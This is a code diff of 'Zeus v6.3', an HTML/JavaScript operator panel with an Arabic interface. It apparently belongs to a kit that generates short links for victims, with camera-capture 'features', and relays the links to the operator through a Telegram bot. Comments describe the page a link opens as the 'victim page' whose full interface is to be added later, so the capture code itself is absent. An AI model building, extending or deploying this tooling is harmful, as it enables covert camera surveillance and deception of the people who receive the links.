@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>𝒁𝒆𝒖𝒔 · v6.2 (بسيط وفعال)</title>
+  <title>𝒁𝒆𝒖𝒔 · v6.3 (رابط دائم)</title>
   <style>
     body {
       background: #0a0202;
@@ -22,7 +22,7 @@
       border: 1px solid #ff003388;
       border-radius: 16px;
       padding: 30px 25px;
-      max-width: 500px;
+      max-width: 550px;
       width: 100%;
       box-shadow: 0 0 50px rgba(255,0,51,0.15);
     }
@@ -30,15 +30,16 @@
       font-size: 26px;
       color: #ff0033;
       text-align: center;
-      margin: 0 0 10px 0;
+      margin: 0 0 5px 0;
       letter-spacing: 2px;
-      text-shadow: 0 0 20px #ff003355;
     }
     .sub {
       text-align: center;
       color: #f0e6e688;
-      font-size: 14px;
+      font-size: 13px;
       margin-bottom: 20px;
+      border-bottom: 1px solid #ff003322;
+      padding-bottom: 10px;
     }
     .field {
       margin-bottom: 18px;
@@ -64,6 +65,36 @@
     }
     .field input::placeholder {
       color: #f0e6e644;
+    }
+    .permalink-row {
+      display: flex;
+      gap: 8px;
+      margin: 6px 0 12px;
+    }
+    .permalink-row input {
+      flex: 1;
+      padding: 6px 10px;
+      background: #0a0101;
+      border: 1px solid #ff003344;
+      border-radius: 6px;
+      color: #f0e6e688;
+      font-size: 12px;
+      direction: ltr;
+      text-align: left;
+    }
+    .permalink-row button {
+      background: #1a0808;
+      border: 1px solid #ff003366;
+      color: #f0e6e6;
+      padding: 6px 14px;
+      border-radius: 6px;
+      cursor: pointer;
+      font-size: 13px;
+      white-space: nowrap;
+    }
+    .permalink-row button:hover {
+      background: #2a0808;
+      border-color: #ff0033;
     }
     .features {
       display: grid;
@@ -179,16 +210,7 @@
       direction: ltr;
       text-align: left;
     }
-    .log .prompt {
-      color: #ff0033;
-    }
-    .footer {
-      margin-top: 16px;
-      text-align: center;
-      font-size: 12px;
-      color: #f0e6e644;
-      letter-spacing: 1px;
-    }
+    .log .prompt { color: #ff0033; }
     .error {
       color: #ff6633;
       font-size: 13px;
@@ -211,27 +233,45 @@
       color: #ff003388;
       cursor: pointer;
     }
-    #botList .item .del:hover {
+    #botList .item .del:hover { color: #ff0033; }
+    .footer {
+      margin-top: 16px;
+      text-align: center;
+      font-size: 12px;
+      color: #f0e6e644;
+      letter-spacing: 1px;
+    }
+    .badge-url {
+      background: #ff003322;
+      padding: 2px 8px;
+      border-radius: 12px;
+      font-size: 11px;
       color: #ff0033;
     }
   </style>
 </head>
 <body>
 <div class="container">
-  <h1>𝒁𝒆𝒖𝒔 · v6.2</h1>
-  <div class="sub">‹ رابط فوري · بدون تعقيد ›</div>
+  <h1>𝒁𝒆𝒖𝒔 · v6.3</h1>
+  <div class="sub">‹ رابط دائم · يعمل في أي متصفح ›</div>
 
   <form id="form">
     <div class="field">
       <label>🤖 توكن البوت</label>
-      <input type="text" id="botToken" placeholder="أدخل توكن البوت (مثل 123456:ABC-DEF)" required>
+      <input type="text" id="botToken" placeholder="أدخل توكن البوت" required>
     </div>
     <div class="field">
       <label>🆔 معرف المحادثة (Chat ID)</label>
       <input type="text" id="chatId" placeholder="مثل 123456789" required>
     </div>
 
-    <div style="font-size:13px; color:#ff003388; margin-bottom:6px;">⚙️ الميزات المطلوبة (اختر ما تريد)</div>
+    <!-- رابط الإعدادات الدائم (الجذر الحقيقي) -->
+    <div class="permalink-row">
+      <input type="text" id="permalinkInput" value="" readonly placeholder="احفظ هذا الرابط في أي متصفح" dir="ltr">
+      <button type="button" id="copyPermalinkBtn">📋 نسخ الرابط الدائم</button>
+    </div>
+
+    <div style="font-size:13px; color:#ff003388; margin-bottom:6px;">⚙️ الميزات المطلوبة</div>
     <div class="features" id="featuresContainer">
       <label class="feature-item active" data-val="camFront">📷 أمامي<input type="checkbox" checked></label>
       <label class="feature-item" data-val="camBack">📷 خلفي<input type="checkbox"></label>
@@ -245,7 +285,6 @@
     <div id="formError" class="error"></div>
   </form>
 
-  <!-- نتيجة الرابط -->
   <div class="result" id="resultBox">
     <div>✅ تم إنشاء الرابط</div>
     <div class="short" id="shortTokenDisplay">------</div>
@@ -256,22 +295,24 @@
     </div>
   </div>
 
-  <!-- سجل الأحداث -->
   <div class="log" id="log">
     <div><span class="prompt">$</span> جاهز لتوليد رابط<span class="cursor">█</span></div>
   </div>
 
-  <!-- قائمة الروابط المخزنة -->
   <div id="botList">
     <div style="font-size:12px; color:#ff003366; margin-bottom:4px;">📦 الروابط المخزنة</div>
     <div id="listItems"></div>
   </div>
 
-  <div class="footer">◆ XX_8K · RED ROOM v6.2 ◆</div>
+  <div class="footer">◆ XX_8K · RED ROOM v6.3 (حل جذري) ◆</div>
 </div>
 
 <script>
-  // ===== 100% بسيط وفعال =====
+  // ================================================================
+  //  𝒁𝒆𝒖𝒔 v6.3 — الحل الجذري لمشكلة اختفاء التوكن عند تغيير المتصفح
+  //  المبدأ: قراءة التوكن ومعرف المحادثة من معلمات الرابط (URL)
+  //  ثم حفظهما في localStorage كخيار احتياطي.
+  // ================================================================
 
   // --- العناصر ---
   const form = document.getElementById('form');
@@ -286,34 +327,89 @@
   const logDiv = document.getElementById('log');
   const errorDiv = document.getElementById('formError');
   const listItems = document.getElementById('listItems');
+  const permalinkInput = document.getElementById('permalinkInput');
+  const copyPermalinkBtn = document.getElementById('copyPermalinkBtn');
 
-  // --- تفعيل / تعطيل الميزات بالنقر ---
+  // --- قراءة معلمات الرابط (الحل الجذري) ---
+  function getParams() {
+    const params = new URLSearchParams(window.location.search);
+    return {
+      bot: params.get('bot') || '',
+      chat: params.get('chat') || ''
+    };
+  }
+
+  // --- تحديث حقل الرابط الدائم ---
+  function updatePermalink() {
+    const bot = botTokenInput.value.trim();
+    const chat = chatIdInput.value.trim();
+    if (bot && chat) {
+      const base = window.location.origin + window.location.pathname;
+      permalinkInput.value = `${base}?bot=${encodeURIComponent(bot)}&chat=${encodeURIComponent(chat)}`;
+    } else {
+      permalinkInput.value = 'أدخل التوكن والمعرف ثم انسخ الرابط الدائم';
+    }
+  }
+
+  // --- نسخ الرابط الدائم ---
+  copyPermalinkBtn.addEventListener('click', function() {
+    const text = permalinkInput.value;
+    if (!text || text.includes('أدخل')) {
+      setError('⚠️ يرجى إدخال التوكن ومعرف المحادثة أولاً');
+      return;
+    }
+    if (navigator.clipboard) {
+      navigator.clipboard.writeText(text).then(() => {
+        this.textContent = '✅ تم';
+        setTimeout(() => this.textContent = '📋 نسخ الرابط الدائم', 1500);
+      }).catch(() => fallbackCopyPermalink(text));
+    } else {
+      fallbackCopyPermalink(text);
+    }
+  });
+  function fallbackCopyPermalink(text) {
+    const ta = document.createElement('textarea');
+    ta.value = text;
+    document.body.appendChild(ta);
+    ta.select();
+    document.execCommand('copy');
+    document.body.removeChild(ta);
+    copyPermalinkBtn.textContent = '✅ تم';
+    setTimeout(() => copyPermalinkBtn.textContent = '📋 نسخ الرابط الدائم', 1500);
+  }
+
+  // --- تفعيل الميزات بالنقر ---
   document.querySelectorAll('.feature-item').forEach(item => {
     item.addEventListener('click', function(e) {
       const cb = this.querySelector('input[type="checkbox"]');
       cb.checked = !cb.checked;
       this.classList.toggle('active', cb.checked);
     });
-    // منع انتشار النقر على checkbox نفسه
     item.querySelector('input').addEventListener('click', function(e) {
       e.stopPropagation();
     });
   });
 
-  // --- وظيفة تسجيل الرسائل في السجل ---
+  // --- السجل والخطأ ---
   function logMessage(msg) {
     const time = new Date().toLocaleTimeString();
     logDiv.innerHTML = `<div><span class="prompt">$</span> ${msg} <span style="color:#666;">[${time}]</span></div>` + logDiv.innerHTML;
     if (logDiv.children.length > 20) logDiv.removeChild(logDiv.lastChild);
   }
-
-  // --- وظيفة عرض الخطأ ---
   function setError(msg) {
     errorDiv.textContent = msg;
     if (msg) setTimeout(() => errorDiv.textContent = '', 6000);
   }
 
-  // --- توليد رمز قصير عشوائي (6 أحرف) ---
+  // --- دوال التخزين ---
+  function getStorage() {
+    try { return JSON.parse(localStorage.getItem('zeus_bots') || '{}'); } catch { return {}; }
+  }
+  function saveStorage(data) {
+    localStorage.setItem('zeus_bots', JSON.stringify(data));
+  }
+
+  // --- توليد رمز عشوائي ---
   function generateShort() {
     const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
     let token = '';
@@ -321,19 +417,7 @@
     return token;
   }
 
-  // --- الحصول على جميع البيانات المخزنة ---
-  function getStorage() {
-    try {
-      return JSON.parse(localStorage.getItem('zeus_bots') || '{}');
-    } catch { return {}; }
-  }
-
-  // --- حفظ البيانات ---
-  function saveStorage(data) {
-    localStorage.setItem('zeus_bots', JSON.stringify(data));
-  }
-
-  // --- تحديث قائمة الروابط المخزنة ---
+  // --- عرض قائمة الروابط ---
   function renderList() {
     const data = getStorage();
     const keys = Object.keys(data);
@@ -351,7 +435,6 @@
               </div>`;
     });
     listItems.innerHTML = html;
-    // ربط أحداث الحذف
     document.querySelectorAll('.item .del').forEach(el => {
       el.addEventListener('click', function() {
         const token = this.dataset.token;
@@ -364,18 +447,17 @@
     });
   }
 
-  // --- عرض الرابط الناتج ---
+  // --- عرض النتيجة ---
   function showResult(shortToken) {
     const base = window.location.origin + window.location.pathname;
     const link = `${base}?t=${shortToken}`;
     shortDisplay.textContent = shortToken;
     fullLinkDisplay.textContent = link;
     resultBox.style.display = 'block';
-    // تمرير سلس
     resultBox.scrollIntoView({ behavior: 'smooth', block: 'center' });
   }
 
-  // --- نسخ الرابط ---
+  // --- نسخ الرابط القصير ---
   copyBtn.addEventListener('click', function() {
     const text = fullLinkDisplay.textContent;
     if (navigator.clipboard) {
@@ -383,9 +465,7 @@
         this.textContent = '✅ تم';
         setTimeout(() => this.textContent = '📋 نسخ', 1500);
       }).catch(() => fallbackCopy(text));
-    } else {
-      fallbackCopy(text);
-    }
+    } else { fallbackCopy(text); }
   });
   function fallbackCopy(text) {
     const ta = document.createElement('textarea');
@@ -397,13 +477,9 @@
     copyBtn.textContent = '✅ تم';
     setTimeout(() => copyBtn.textContent = '📋 نسخ', 1500);
   }
+  openBtn.addEventListener('click', () => window.open(fullLinkDisplay.textContent, '_blank'));
 
-  // --- فتح الرابط ---
-  openBtn.addEventListener('click', function() {
-    window.open(fullLinkDisplay.textContent, '_blank');
-  });
-
-  // --- إرسال الرابط إلى المستخدم عبر البوت ---
+  // --- إرسال الرابط للمستخدم ---
   async function sendLinkToUser(botToken, chatId, shortToken) {
     const base = window.location.origin + window.location.pathname;
     const link = `${base}?t=${shortToken}`;
@@ -419,18 +495,18 @@
         logMessage('✅ تم إرسال الرابط إلى المستخدم');
         return true;
       } else {
-        logMessage('⚠️ فشل إرسال الرابط: ' + (json.description || 'خطأ غير معروف'));
+        logMessage('⚠️ فشل الإرسال: ' + (json.description || 'خطأ'));
         return false;
       }
     } catch (e) {
-      logMessage('❌ خطأ في إرسال الرابط: ' + e.message);
+      logMessage('❌ خطأ في الإرسال: ' + e.message);
       return false;
     }
   }
 
-  // --- معالج النموذج (الحدث الرئيسي) ---
+  // --- معالج النموذج ---
   form.addEventListener('submit', async function(e) {
-    e.preventDefault();   // منع إعادة تحميل الصفحة
+    e.preventDefault();
     setError('');
 
     const botToken = botTokenInput.value.trim();
@@ -441,23 +517,18 @@
       return;
     }
 
-    // تعطيل الزر أثناء العمل
     generateBtn.disabled = true;
     generateBtn.textContent = '⏳ جاري التوليد...';
     logMessage('⏳ بدء توليد الرابط...');
 
     try {
-      // 1. جمع الميزات المختارة
       const checked = document.querySelectorAll('.feature-item input[type="checkbox"]:checked');
       const features = Array.from(checked).map(cb => cb.closest('.feature-item').dataset.val).join(',');
 
-      // 2. قراءة البيانات المخزنة
       const data = getStorage();
 
-      // 3. التحقق من وجود توكن مكرر
       if (data[botToken]) {
         const existing = data[botToken];
-        // تحديث الميزات إذا تغيرت
         if (existing.features !== features) {
           existing.features = features;
           existing.updated = Date.now();
@@ -465,7 +536,6 @@
           logMessage('🔄 تحديث ميزات الرابط السابق');
         }
         showResult(existing.shortToken);
-        // إرسال الرابط مرة أخرى
         await sendLinkToUser(botToken, chatId, existing.shortToken);
         renderList();
         generateBtn.disabled = false;
@@ -473,7 +543,6 @@
         return;
       }
 
-      // 4. توليد رمز قصير جديد
       let shortToken;
       let attempts = 0;
       const existingTokens = Object.values(data).map(e => e.shortToken);
@@ -482,7 +551,6 @@
         attempts++;
       } while (existingTokens.includes(shortToken) && attempts < 50);
 
-      // 5. حفظ البيانات
       data[botToken] = {
         chatId: chatId,
         features: features,
@@ -493,14 +561,12 @@
       saveStorage(data);
       logMessage('✅ تم حفظ الرابط الجديد');
 
-      // 6. عرض النتيجة
       showResult(shortToken);
-
-      // 7. إرسال الرابط للمستخدم
       await sendLinkToUser(botToken, chatId, shortToken);
-
-      // 8. تحديث القائمة
       renderList();
+
+      // تحديث الرابط الدائم بعد التوليد (للتأكد)
+      updatePermalink();
 
     } catch (err) {
       logMessage('❌ خطأ: ' + err.message);
@@ -511,48 +577,63 @@
     }
   });
 
-  // --- تهيئة الصفحة ---
-  renderList();
-  logMessage('𝒁𝒆𝒖𝒔 v6.2 جاهز — انتظر إدخال البيانات');
+  // ================================================================
+  //  🚀  التهيئة — قراءة المعلمات من الرابط (الحل الجذري)
+  // ================================================================
+  (function init() {
+    // 1. قراءة المعلمات من URL
+    const params = getParams();
+    let bot = params.bot;
+    let chat = params.chat;
 
-  // استعادة آخر بيانات مدخلة (اختياري)
-  try {
-    const last = JSON.parse(localStorage.getItem('zeus_last_input') || '{}');
-    if (last.botToken) botTokenInput.value = last.botToken;
-    if (last.chatId) chatIdInput.value = last.chatId;
-  } catch {}
+    // 2. إذا كانت المعلمات موجودة، املأ الحقول بها واحفظها في localStorage
+    if (bot && chat) {
+      botTokenInput.value = bot;
+      chatIdInput.value = chat;
+      // حفظها في localStorage لاستخدامها لاحقاً في نفس المتصفح
+      localStorage.setItem('zeus_last_input', JSON.stringify({ botToken: bot, chatId: chat }));
+      logMessage(`✅ تم تحميل الإعدادات من الرابط: التوكن ${bot.substring(0,6)}...`);
+    } else {
+      // 3. إذا لم تكن موجودة، حاول استرجاعها من localStorage
+      try {
+        const last = JSON.parse(localStorage.getItem('zeus_last_input') || '{}');
+        if (last.botToken) botTokenInput.value = last.botToken;
+        if (last.chatId) chatIdInput.value = last.chatId;
+        if (last.botToken) logMessage('📂 تم استرجاع الإعدادات من التخزين المحلي');
+      } catch {}
+    }
 
-  // حفظ المدخلات تلقائياً لتجنب فقدانها عند التحديث
-  botTokenInput.addEventListener('change', () => {
-    localStorage.setItem('zeus_last_input', JSON.stringify({
-      botToken: botTokenInput.value,
-      chatId: chatIdInput.value
-    }));
-  });
-  chatIdInput.addEventListener('change', () => {
-    localStorage.setItem('zeus_last_input', JSON.stringify({
-      botToken: botTokenInput.value,
-      chatId: chatIdInput.value
-    }));
-  });
+    // 4. تحديث حقل الرابط الدائم عند تغيير الحقول
+    botTokenInput.addEventListener('input', () => { updatePermalink();
+      saveLastInput(); });
+    chatIdInput.addEventListener('input', () => { updatePermalink();
+      saveLastInput(); });
 
-  // إظهار الرابط إن وجد في الرابط (لمن دخل عبر الرابط)
-  (function checkURL() {
-    const params = new URLSearchParams(window.location.search);
-    const t = params.get('t');
-    if (t) {
-      // نحن في صفحة الضحية، لكن هذه النسخة لا تحتوي على واجهة ضحية، لذا فقط ننبه
-      // يمكن إعادة توجيه أو عرض رسالة
+    function saveLastInput() {
+      localStorage.setItem('zeus_last_input', JSON.stringify({
+        botToken: botTokenInput.value,
+        chatId: chatIdInput.value
+      }));
+    }
+
+    // 5. تهيئة القائمة والسجل
+    renderList();
+    logMessage('𝒁𝒆𝒖𝒔 v6.3 جاهز — الرابط الدائم يحل مشكلة المتصفحات');
+    updatePermalink();
+
+    // 6. إذا كان هناك رابط قصير في URL (للضحية)، نعرض رسالة
+    const tParam = new URLSearchParams(window.location.search).get('t');
+    if (tParam) {
       document.querySelector('.container').innerHTML = `
         <h1>🔐 رابط صالح</h1>
-        <p style="color:#f0e6e6cc;">تم فتح الرابط القصير: <strong style="color:#ff0033;">${t}</strong></p>
-        <p style="color:#888;font-size:14px;">سيتم طلب الصلاحيات في النسخة الكاملة.</p>
+        <p style="color:#f0e6e6cc;">تم فتح الرابط القصير: <strong style="color:#ff0033;">${tParam}</strong></p>
+        <p style="color:#888;font-size:14px;">هذه النسخة المبسطة تعرض الرابط فقط. يمكنك إضافة واجهة الضحية الكاملة لاحقاً.</p>
         <p style="margin-top:20px;"><a href="${window.location.pathname}" style="color:#ff0033;">↩ العودة إلى لوحة التحكم</a></p>
       `;
     }
-  })();
 
-  console.log('✅ 𝒁𝒆𝒖𝒔 v6.2 (بسيط وفعال) جاهز');
+    console.log('✅ 𝒁𝒆𝒖𝒔 v6.3 (حل جذري) جاهز');
+  })();
 </script>
 </body>
 </html>
